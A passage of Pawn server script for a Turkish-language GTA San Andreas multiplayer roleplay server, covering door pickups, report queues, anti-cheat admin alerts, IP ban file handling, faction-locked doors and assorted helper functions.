			DDoorsInfo[doorid][ddTextID] = CreateDynamic3DTextLabel(string, COLOR_YELLOW, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ]+0.7,10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, DDoorsInfo[doorid][ddExteriorVW], DDoorsInfo[doorid][ddExteriorInt], -1);
		}
	}

	switch(DDoorsInfo[doorid][ddPickupModel])
	{
	    case -1: { /* Disable Pickup */ }
		case 1:
		{
			{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1210, 23, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		}
		case 2: {DDoorsInfo[doorid][ddPickupID] = CreatePickup(1212, 1, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 3:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1239, 1, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 4:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1240, 1, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 5:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1241, 1, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 6:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1242, 1, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 7:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1247, 1, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 8:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1248, 1, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 9:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1252, 1, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 10:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1253, 1, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 11:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1254, 23, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 12:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1313, 23, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 13:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1272, 23, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 14:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1273, 23, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 15:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1274, 23, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 16:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1275, 23, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 17:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1276, 23, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 18:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1277, 23, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 19:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1279, 23, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 20:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1314, 23, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 21:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1316, 23, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 22:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1317, 23, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 23:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1559, 23, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 24:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1582, 23, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 25:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(2894, 23, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
	    default:
	    {
			DDoorsInfo[doorid][ddPickupID] = CreatePickup(1318, 23, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);
		}
	}
}

stock ClearHouse(houseid)
{
	HouseInfo[houseid][hOwned] = 0;
	HouseInfo[houseid][hSafeMoney] = 0;
	HouseInfo[houseid][hPot] = 0;
	HouseInfo[houseid][hCrack] = 0;
	HouseInfo[houseid][hMaterials] = 0;
	HouseInfo[houseid][hWeapons][0] = 0;
	HouseInfo[houseid][hWeapons][1] = 0;
	HouseInfo[houseid][hWeapons][2] = 0;
	HouseInfo[houseid][hWeapons][3] = 0;
	HouseInfo[houseid][hWeapons][4] = 0;
	HouseInfo[houseid][hGLUpgrade] = 1;
}

stock ResetPlayerCash(playerid)
{
	PlayerInfo[playerid][pCash] = 0;
	ResetPlayerMoney(playerid);
	return 1;
}

SetFamilySkin(playerid, skinid)
{
	new gang;
	new skin;
	gang = PlayerInfo[playerid][pGang];
	skin = FamilyInfo[gang][FamilySkins][skinid];
	if(skin==0) return 1;
	PlayerInfo[playerid][pSkin] = skin;
	SetPlayerSkin(playerid, skin);
	return 1;
}

stock Random(min, max)
{
    new a = random(max - min) + min;
    return a;
}

stock SendBugReportToQueue(reportfrom, report[])
{
    new bool:breakingloop = false, newid = INVALID_REPORT_ID;

	for(new i=0;i<MAX_REPORTS;i++)
	{
		if(!breakingloop)
		{
			if(Reports[i][HasBeenUsed] == 0)
			{
				breakingloop = true;
				newid = i;
			}
		}
    }
    if(newid != INVALID_REPORT_ID)
    {
        strmid(Reports[newid][Report], report, 0, strlen(report), 128);
        Reports[newid][ReportFrom] = reportfrom;
        Reports[newid][TimeToExpire] = 99999;
        Reports[newid][HasBeenUsed] = 1;
        Reports[newid][BeingUsed] = 1;
        Reports[newid][BugReport] = 1;
        Reports[newid][ReportExpireTimer] = SetTimerEx("ReportTimer", 60000, 0, "d", newid);
        new string[128];
        format(string, sizeof(string), "BUG: [%i] %s (BID: %i): %s", reportfrom, GetPlayerNameEx(reportfrom), newid, (report));
        ABroadCast(0xFF8000FF, string, 1);
    }
    else
    {
        ClearReports();
        SendReportToQueue(reportfrom, report);
    }
}

stock SendReportToQueue(reportfrom, report[])
{
    new bool:breakingloop = false, newid = INVALID_REPORT_ID;

	for(new i=0;i<MAX_REPORTS;i++)
	{
		if(!breakingloop)
		{
			if(Reports[i][HasBeenUsed] == 0)
			{
				breakingloop = true;
				newid = i;
			}
		}
    }
    if(newid != INVALID_REPORT_ID)
    {
        strmid(Reports[newid][Report], report, 0, strlen(report), 128);
        Reports[newid][ReportFrom] = reportfrom;
        Reports[newid][TimeToExpire] = 5;
        Reports[newid][HasBeenUsed] = 1;
        Reports[newid][BeingUsed] = 1;
        Reports[newid][ReportExpireTimer] = SetTimerEx("ReportTimer", 60000, 0, "d", newid);
        new string[128];
        format(string, sizeof(string), "Report from [%i] %s (RID: %i): %s", reportfrom, GetPlayerNameEx(reportfrom), newid, (report));
        ABroadCast(COLOR_REPORT,string,1);
    }
    else
    {
        ClearReports();
        SendReportToQueue(reportfrom, report);
    }
}

stock ClearReports()
{
	for(new i=0;i<MAX_REPORTS;i++)
	{
		strmid(Reports[i][Report], "Yok", 0, 4, 4);
		Reports[i][CheckingReport] = 999;
        Reports[i][ReportFrom] = 999;
        Reports[i][TimeToExpire] = 5;
        Reports[i][HasBeenUsed] = 0;
        Reports[i][BeingUsed] = 0;
        Reports[i][BugReport] = 0;
	}
	return 1;
}

stock ClearChatbox(playerid)
{
	for(new i = 0; i < 50; i++) {
		SendClientMessage(playerid, COLOR_WHITE, "");
	}
	return 1;
}

stock PlayerFacePlayer(playerid, targetplayerid)
{
	new Float: Angle;
	GetPlayerFacingAngle(playerid, Angle);
	SetPlayerFacingAngle(targetplayerid, Angle+180);
	return true;
}

stock GivePlayerEventWeapons(playerid)
{
	if(GetPVarInt(playerid, "EventToken") == 1)
	{
		GivePlayerWeapon(playerid, EventInfo[EventWeapons][0], 60000);
		GivePlayerWeapon(playerid, EventInfo[EventWeapons][1], 60000);
		GivePlayerWeapon(playerid, EventInfo[EventWeapons][2], 60000);
		GivePlayerWeapon(playerid, EventInfo[EventWeapons][3], 60000);
		GivePlayerWeapon(playerid, EventInfo[EventWeapons][4], 60000);
	}
	return 1;
}

stock ScoreUpdate()
{
	new LevScore;
	foreach(Player, i)
	{
   		LevScore = PlayerInfo[i][pLevel];
		SetPlayerScore(i, LevScore);
	}
	return 1;
}

stock ExecuteHackerAction(playerid, weaponid)
{
	if(!gPlayerLogged[playerid]) { return 1; }
	if(PlayerInfo[playerid][pTut] == 0) { return 1; } // NOT IMPLEMENTED YET
	if(playerTabbed[playerid] == 1) { return 1; }
	if(GetPVarInt(playerid, "PBM") > 0) { return 1; }

	new String[128], WeaponName[128];
	GetWeaponName(weaponid, WeaponName, sizeof(WeaponName));

	format(String, sizeof(String), "{AA3333}Admin Uyarý{FFFF00}: %s (ID %d) kiþisi weapon hack kullanýyor olabilir(%s).", GetPlayerNameEx(playerid), playerid, WeaponName);
	ABroadCast(COLOR_YELLOW, String, 2);

	SetPVarInt(playerid, "wpH", GetPVarInt(playerid, "wpH")+1);

	if(GetPVarInt(playerid, "wpH") >= 3) {
		format(String, sizeof(String), "%s kiþisi weapon hack kullanýyor olabilir (%s).", GetPlayerNameEx(playerid), WeaponName);
		AddAutomatedFlag(playerid, String);
	}

	//format(String, sizeof(String), "%s (ID %d) may possibly be weapon hacking (%s)", GetPlayerNameEx(playerid), playerid, WeaponName);
	//Log("logs/hack.log", String);
	return 1;
}

stock IsValidIP(ip[])
{
    new a;
	for (new i = 0; i < strlen(ip); i++)
	{
		if(ip[i] == '.')
		{
		    a++;
		}
	}
	if(a != 3)
	{
	    return 1;
	}
	return 0;
}

stock fcreate(filename[])
{
	if(fexist(filename)) return false;
	new File:fhnd;
	fhnd=fopen(filename,io_write);
	if(fhnd) {
		fclose(fhnd);
		return true;
	}
	return false;
}

stock CheckBan(ip[])
{
	new string[20];
    new File: file = fopen("ban.cfg", io_read);
	while(fread(file, string))
	{
	    if(strcmp(ip, string, true, strlen(ip)) == 0)
	    {
	        fclose(file);
	        return 1;
	    }
	}
	fclose(file);
	return 0;
}

stock AddBan(ip[])
{
	if(CheckBan(ip) == 0)
	{
		new File: file = fopen("ban.cfg", io_append);
		new string[20];
		format(string, sizeof(string), "\n%s", ip);
	 	fwrite(file, string);
	 	fclose(file);
	 	foreach(Player, playerid)
		{
		    new playerIP[16];
			GetPlayerIp(playerid, playerIP, sizeof(playerIP));
			if(strcmp(playerIP, ip) == 0)
			{
	            SendClientMessage(playerid, COLOR_CYAN, "Oyundan banlandýnýz. Ban temyizi açtýrmak için www.phoenix-roleplay.xyz adresini ziyaret ediniz");
				Kick(playerid);
			}
		}
		return 1;
	}
	return 0;
}

stock RemoveBan(ip[])
{
    if(CheckBan(ip) == 1)
	{
	    new string[20];
		new File: file = fopen("ban.cfg", io_read);
		fcreate("tempBan.cfg");
		new File: file2 = fopen("tempBan.cfg", io_append);
		while(fread(file, string))
		{
			if(strcmp(ip, string, true, strlen(ip)) != 0 && strcmp("\n", string) != 0)
		    {
				fwrite(file2, string);
			}
		}
		fclose(file);
		fclose(file2);
		file = fopen("ban.cfg", io_write);
		file2 = fopen("tempBan.cfg", io_read);
		while(fread(file2, string))
		{
			fwrite(file, string);
		}
		fclose(file);
		fclose(file2);
		fremove("tempBan.cfg");
		return 1;
    }
	return 0;
}

stock GetPlayerNameExEx(playerid)
{
	new name[MAX_PLAYER_NAME];
	GetPlayerName(playerid, name, sizeof(name));
	return name;
}

public OnPlayerPressButton(playerid, buttonid)
{
	// LSPD
   	if(buttonid == lspdcopsonly)
    {
	    if(PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pLeader] == 2 || PlayerInfo[playerid][pFaction] == 1 || PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pFaction] == 5)
		{
				DoorOpen(playerid);
				SetTimer("DoorClose", 4000, 0);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "   Polis veya FBI üyesi deðilsiniz!");
		}

	}
   	if(buttonid == lspdeveryone)
    {

		DoorOpen(playerid);
		SetTimer("DoorClose", 3500, 0);

	}

	// FBI
	if(buttonid == FBILobbyLeftBTN[0] || buttonid == FBILobbyLeftBTN[1])
	{
	    if(PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pLeader] == 2 || PlayerInfo[playerid][pFaction] == 5)
	    {
	        MoveDynamicObject(FBILobbyLeft,293.93002319,-1498.43457031,-46.13965225,4);
			SetTimer("CloseFBILobbyLeft", 2500, 0);
	    }
	    else
	    {
	        SendClientMessage(playerid,COLOR_GREY,"Eriþim engellendi.");
			return 1;
		}
	}
	if(buttonid == FBILobbyRightBTN[0] || buttonid == FBILobbyRightBTN[1])
	{
	    if(PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pLeader] == 2 || PlayerInfo[playerid][pFaction] == 5)
	    {
	        MoveDynamicObject(FBILobbyRight,303.84756470,-1521.62988281,-46.13965225,4);
			SetTimer("CloseFBILobbyRight", 2500, 0);
	    }
	    else
	    {
	        SendClientMessage(playerid,COLOR_GREY,"Eriþim engellendi.");
			return 1;
		}
	}
	if(buttonid == FBIPrivateBTN[0] || buttonid == FBIPrivateBTN[1])
	{
	    if((PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pLeader] == 2) && PlayerInfo[playerid][pRank] >= 5 || PlayerInfo[playerid][pFaction] == 5)
	    {
	        MoveDynamicObject(FBIPrivate[0],299.29986572,-1491.75842285,-28.73300552,4);
	        MoveDynamicObject(FBIPrivate[1],299.33737183,-1496.86145020,-28.73300552,4);
			SetTimer("CloseFBIPrivate", 2500, 0);
	    }
	    else
	    {
	        SendClientMessage(playerid,COLOR_GREY,"Eriþim engellendi.");
			return 1;
		}
	}
	return false;
}

forward DoorOpen(playerid);
public DoorOpen(playerid)
{
	MoveDynamicObject(lspddoor1, 247.2763671875,72.536186218262,1002.640625, 3.5000);
 	MoveDynamicObject(lspddoor2, 244.0330657959,72.580932617188,1002.640625, 3.5000);
  	return 1;
}

forward DoorClose(playerid);
public DoorClose(playerid)
{
	MoveDynamicObject(lspddoor1, 246.35150146484,72.547714233398,1002.640625, 3.5000);
 	MoveDynamicObject(lspddoor2, 245.03300476074,72.568511962891,1002.640625, 3.5000);
  	return 1;
}

forward CloseFBILobbyLeft();
public CloseFBILobbyLeft()
{
	MoveDynamicObject(FBILobbyLeft,295.40136719,-1498.43457031,-46.13965225,4);
	return 1;
}

forward CloseFBILobbyRight();
public CloseFBILobbyRight()
{
	MoveDynamicObject(FBILobbyRight,302.39355469,-1521.62988281,-46.13965225,4);
	return 1;
}

forward CloseFBIPrivate();
public CloseFBIPrivate()
{
	MoveDynamicObject(FBIPrivate[0],299.29986572,-1492.82666016,-28.73300552,4);
	MoveDynamicObject(FBIPrivate[1],299.33737183,-1495.83911133,-28.73300552,4);
	return 1;
}

stock crc32(string[])
{
	new crc_table[256] = {
			0x00000000, 0x77073096, 0xEE0E612C, 0x990951BA, 0x076DC419, 0x706AF48F, 0xE963A535,
			0x9E6495A3, 0x0EDB8832, 0x79DCB8A4, 0xE0D5E91E, 0x97D2D988, 0x09B64C2B, 0x7EB17CBD,
			0xE7B82D07, 0x90BF1D91, 0x1DB71064, 0x6AB020F2, 0xF3B97148, 0x84BE41DE, 0x1ADAD47D,
			0x6DDDE4EB, 0xF4D4B551, 0x83D385C7, 0x136C9856, 0x646BA8C0, 0xFD62F97A, 0x8A65C9EC,
			0x14015C4F, 0x63066CD9, 0xFA0F3D63, 0x8D080DF5, 0x3B6E20C8, 0x4C69105E, 0xD56041E4,
			0xA2677172, 0x3C03E4D1, 0x4B04D447, 0xD20D85FD, 0xA50AB56B, 0x35B5A8FA, 0x42B2986C,
			0xDBBBC9D6, 0xACBCF940, 0x32D86CE3, 0x45DF5C75, 0xDCD60DCF, 0xABD13D59, 0x26D930AC,
			0x51DE003A, 0xC8D75180, 0xBFD06116, 0x21B4F4B5, 0x56B3C423, 0xCFBA9599, 0xB8BDA50F,
			0x2802B89E, 0x5F058808, 0xC60CD9B2, 0xB10BE924, 0x2F6F7C87, 0x58684C11, 0xC1611DAB,
			0xB6662D3D, 0x76DC4190, 0x01DB7106, 0x98D220BC, 0xEFD5102A, 0x71B18589, 0x06B6B51F,
			0x9FBFE4A5, 0xE8B8D433, 0x7807C9A2, 0x0F00F934, 0x9609A88E, 0xE10E9818, 0x7F6A0DBB,
			0x086D3D2D, 0x91646C97, 0xE6635C01, 0x6B6B51F4, 0x1C6C6162, 0x856530D8, 0xF262004E,
			0x6C0695ED, 0x1B01A57B, 0x8208F4C1, 0xF50FC457, 0x65B0D9C6, 0x12B7E950, 0x8BBEB8EA,
			0xFCB9887C, 0x62DD1DDF, 0x15DA2D49, 0x8CD37CF3, 0xFBD44C65, 0x4DB26158, 0x3AB551CE,
			0xA3BC0074, 0xD4BB30E2, 0x4ADFA541, 0x3DD895D7, 0xA4D1C46D, 0xD3D6F4FB, 0x4369E96A,
			0x346ED9FC, 0xAD678846, 0xDA60B8D0, 0x44042D73, 0x33031DE5, 0xAA0A4C5F, 0xDD0D7CC9,
			0x5005713C, 0x270241AA, 0xBE0B1010, 0xC90C2086, 0x5768B525, 0x206F85B3, 0xB966D409,
			0xCE61E49F, 0x5EDEF90E, 0x29D9C998, 0xB0D09822, 0xC7D7A8B4, 0x59B33D17, 0x2EB40D81,
			0xB7BD5C3B, 0xC0BA6CAD, 0xEDB88320, 0x9ABFB3B6, 0x03B6E20C, 0x74B1D29A, 0xEAD54739,
			0x9DD277AF, 0x04DB2615, 0x73DC1683, 0xE3630B12, 0x94643B84, 0x0D6D6A3E, 0x7A6A5AA8,
			0xE40ECF0B, 0x9309FF9D, 0x0A00AE27, 0x7D079EB1, 0xF00F9344, 0x8708A3D2, 0x1E01F268,
			0x6906C2FE, 0xF762575D, 0x806567CB, 0x196C3671, 0x6E6B06E7, 0xFED41B76, 0x89D32BE0,
			0x10DA7A5A, 0x67DD4ACC, 0xF9B9DF6F, 0x8EBEEFF9, 0x17B7BE43, 0x60B08ED5, 0xD6D6A3E8,
			0xA1D1937E, 0x38D8C2C4, 0x4FDFF252, 0xD1BB67F1, 0xA6BC5767, 0x3FB506DD, 0x48B2364B,
			0xD80D2BDA, 0xAF0A1B4C, 0x36034AF6, 0x41047A60, 0xDF60EFC3, 0xA867DF55, 0x316E8EEF,
			0x4669BE79, 0xCB61B38C, 0xBC66831A, 0x256FD2A0, 0x5268E236, 0xCC0C7795, 0xBB0B4703,
			0x220216B9, 0x5505262F, 0xC5BA3BBE, 0xB2BD0B28, 0x2BB45A92, 0x5CB36A04, 0xC2D7FFA7,
			0xB5D0CF31, 0x2CD99E8B, 0x5BDEAE1D, 0x9B64C2B0, 0xEC63F226, 0x756AA39C, 0x026D930A,
			0x9C0906A9, 0xEB0E363F, 0x72076785, 0x05005713, 0x95BF4A82, 0xE2B87A14, 0x7BB12BAE,
			0x0CB61B38, 0x92D28E9B, 0xE5D5BE0D, 0x7CDCEFB7, 0x0BDBDF21, 0x86D3D2D4, 0xF1D4E242,
			0x68DDB3F8, 0x1FDA836E, 0x81BE16CD, 0xF6B9265B, 0x6FB077E1, 0x18B74777, 0x88085AE6,
			0xFF0F6A70, 0x66063BCA, 0x11010B5C, 0x8F659EFF, 0xF862AE69, 0x616BFFD3, 0x166CCF45,
			0xA00AE278, 0xD70DD2EE, 0x4E048354, 0x3903B3C2, 0xA7672661, 0xD06016F7, 0x4969474D,
			0x3E6E77DB, 0xAED16A4A, 0xD9D65ADC, 0x40DF0B66, 0x37D83BF0, 0xA9BCAE53, 0xDEBB9EC5,
			0x47B2CF7F, 0x30B5FFE9, 0xBDBDF21C, 0xCABAC28A, 0x53B39330, 0x24B4A3A6, 0xBAD03605,
			0xCDD70693, 0x54DE5729, 0x23D967BF, 0xB3667A2E, 0xC4614AB8, 0x5D681B02, 0x2A6F2B94,
			0xB40BBE37, 0xC30C8EA1, 0x5A05DF1B, 0x2D02EF8D
	};
	new crc = -1;
	for(new i = 0; i < strlen(string); i++)
	{
 		crc = (crc >>> 8) ^ crc_table[(crc ^ string[i]) & 0xFF];
  	}
  	return crc ^ -1;
}

stock GetPlayerNameEx(playerid)
{

	new
		sz_playerName[MAX_PLAYER_NAME],
		i_pos;

	GetPlayerName(playerid, sz_playerName, MAX_PLAYER_NAME);
	while ((i_pos = strfind(sz_playerName, "_", false, i_pos)) != -1) sz_playerName[i_pos] = ' ';
	return sz_playerName;
}

stock IsKeyJustDown(key, newkeys, oldkeys)
{
	if((newkeys & key) && !(oldkeys & key)) return 1;
	return 0;
}

stock IsInvalidSkin(skin)
{
	if(!(0 <= skin <= 311)) return 1;
    return 0;
}

stock IsValidSkin(skinid)
{
	if(skinid < 0 || skinid > 311)
	    return 0;

	switch (skinid)
	{
	    case
		0, 105, 106, 107, 102, 103, 69, 123,
		104, 114, 115, 116, 174, 175, 100, 247, 173,
		248, 117, 118, 147, 163, 21, 24, 143, 71,
		156, 176, 177, 108, 109, 110, 165, 166,
		265, 266, 267, 269, 270, 271, 274, 276,
		277, 278, 279, 280, 281, 282, 283, 284,
		285, 286, 287, 288, 294, 296, 297: return 0;
	}

	return 1;
}

stock IsAHelicopter(carid)
{
	if(GetVehicleModel(carid) == 548 || GetVehicleModel(carid) == 425 || GetVehicleModel(carid) == 417 || GetVehicleModel(carid) == 487 || GetVehicleModel(carid) == 488 || GetVehicleModel(carid) == 497 || GetVehicleModel(carid) == 563 || GetVehicleModel(carid) == 447 || GetVehicleModel(carid) == 469 || GetVehicleModel(carid) == 593) {
		return 1;
	}
	return 0;
}

stock  Float: GetVehicleSpeedByVehicleID(vehicleid)
{
	new
		Float: fVelocity[4];

	GetVehicleVelocity(vehicleid, fVelocity[0], fVelocity[1], fVelocity[2]);
	fVelocity[3] = floatsqroot((fVelocity[0] * fVelocity[0]) + (fVelocity[1] * fVelocity[1]) + (fVelocity[2] * fVelocity[2])) * 100;
	fVelocity[3] += fVelocity[3] / 2;
	return fVelocity[3];
}

stock  Float: player_get_speed(playerid)
{
	new
		Float: fVelocity[4];

	GetVehicleVelocity(GetPlayerVehicleID(playerid), fVelocity[0], fVelocity[1], fVelocity[2]);
	fVelocity[3] = floatsqroot((fVelocity[0] * fVelocity[0]) + (fVelocity[1] * fVelocity[1]) + (fVelocity[2] * fVelocity[2])) * 100;
	fVelocity[3] += fVelocity[3] / 2;
	return fVelocity[3];
}

stock CheckVPH(newph)
{
        new PHList[32];
        new number;
        new string[32];
        new File: file = fopen("PHList.cfg", io_read);
        if(file)
		{
            while(fread(file, string))
			{
            	strmid(PHList, string, 0, strlen(string)-2, 255);
                number = strval(PHList);
                if(number == newph)
				{
                	fclose(file);
                    return 1;
    			}
			}
            fclose(file);
            return 0;
        }
        return 1;
}

stock CheckPH(playerid)
{
	if(!fexist("PHList.cfg")) return 1;
	if(PlayerInfo[playerid][pNumber] == 0) {return 0;}
	new PHList[32];
	new number;
	new string[32];

	new File: file = fopen("PHList.cfg", io_read);
	if(file)
	{
		while(fread(file, string))
		{
			strmid(PHList, string, 0, strlen(string)-2, 255);
			number = strval(PHList);
			if(number == PlayerInfo[playerid][pNumber])
			{
				fclose(file);
				return 1;
			}
		}
		fclose(file);
		new File: file2 = fopen("PHList.cfg", io_append);
		format(string, sizeof(string), "%d\r\n", PlayerInfo[playerid][pNumber]);
		fwrite(file2, string);
		fclose(file2);
		//printf("New number added to PHList.cfg, ph:%d player:%s", PlayerInfo[playerid][pNumber], GetPlayerNameEx(playerid));
		return 0;
	}
	return 1;
}

stock ReplacePH(oldph, newph)
{
    new File: file2 = fopen("tmpPHList.cfg", io_write);
    new number;
    new string[32];
    new PHList[32];
    format(string, sizeof(string), "%d\r\n", newph);
    fwrite(file2, string);
    fclose(file2);
    file2 = fopen("tmpPHList.cfg", io_append);
    new File: file = fopen("PHList.cfg", io_read);
    while(fread(file, string))
	{
        strmid(PHList, string, 0, strlen(string)-1, 255);
        number = strval(PHList);
    	if(number != oldph)
		{
            format(string, sizeof(string), "%d\r\n", number);
        	fwrite(file2, string);
    	}
    }
    fclose(file);
    fclose(file2);
    file2 = fopen("PHList.cfg", io_write);
    file = fopen("tmpPHList.cfg", io_read);
	while(fread(file, string))
	{
        strmid(PHList, string, 0, strlen(string)-1, 255);
        number = strval(PHList);
        if(number != oldph)
		{
            format(string, sizeof(string), "%d\r\n", number);
        	fwrite(file2, string);
    	}
    }
    fclose(file);
    fclose(file2);
	fremove("tmpPHList.cfg");
	//printf("ph %d replaced with ph %d in PHList.cfg", oldph, newph);
	return 1;
}

stock RPALN(playerid)
{
	new name[32];
	if(PlayerInfo[playerid][pAdmin] == 1) format(name, sizeof(name), "Level 1 Admin");
	else if(PlayerInfo[playerid][pAdmin] == 2) format(name, sizeof(name), "Level 2 Admin");
	else if(PlayerInfo[playerid][pAdmin] == 3) format(name, sizeof(name), "Level 3 Admin");
	else if(PlayerInfo[playerid][pAdmin] == 4) format(name, sizeof(name), "Level 4 Admin");
	else if(PlayerInfo[playerid][pAdmin] == 5) format(name, sizeof(name), "Level 5 Admin");
	else if(PlayerInfo[playerid][pAdmin] == 6) format(name, sizeof(name), "Level 6 Admin");
    else if(PlayerInfo[playerid][pAdmin] == 7) format(name, sizeof(name), "Level 7 Admin");
    else if(PlayerInfo[playerid][pAdmin] == 8) format(name, sizeof(name), "Level 8 Admin");
	else if(PlayerInfo[playerid][pAdmin] == 9) format(name, sizeof(name), "Level 9 Admin");
	else if(PlayerInfo[playerid][pAdmin] == 10) format(name, sizeof(name), "Server Owner");
	return name;
}

stock RPHLN(playerid)
{
	new name[32];
	if(PlayerInfo[playerid][pHelper] == 1) format(name, sizeof(name), "Level 1 Tester");
	else if(PlayerInfo[playerid][pHelper] == 2) format(name, sizeof(name), "Level 2 Tester");
	else if(PlayerInfo[playerid][pHelper] == 3) format(name, sizeof(name), "Level 3 Tester");
	else if(PlayerInfo[playerid][pHelper] == 4) format(name, sizeof(name), "Level 4 Tester");
	else if(PlayerInfo[playerid][pHelper] == 5) format(name, sizeof(name), "Level 5 Tester");
	else if(PlayerInfo[playerid][pHelper] == 6) format(name, sizeof(name), "Community Advisor");
	return name;
}

stock SearchingHit(playerid)
{
	new string[128];
   	SendClientMessage(playerid, COLOR_WHITE, "Available Contracts:");
   	new hits;
	foreach(Player, i)
	{
		if(PlayerInfo[i][pFaction] != 4 && PlayerInfo[i][pHeadValue] > 0)
		{
	 		if(GotHit[i] == 0)
  			{
				hits++;
